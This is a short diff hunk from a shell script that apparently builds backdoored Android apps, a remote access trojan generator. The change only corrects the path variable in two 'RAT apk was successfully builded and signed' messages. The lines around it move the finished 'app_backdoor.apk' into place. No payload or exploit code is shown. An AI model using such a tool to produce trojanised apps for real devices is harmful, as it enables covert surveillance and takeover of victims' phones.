@@ -579,12 +579,12 @@ echo -e $blue "FatRat have renamed your old backdoor to app_backdoor$ren.apk"
 #Moving finished backdoor file to final destination
 mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
 echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
- $path/backdoored/app_backdoor.apk"
+ $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 else
 mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
 echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
- $path/backdoored/app_backdoor.apk"
+ $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 fi
 
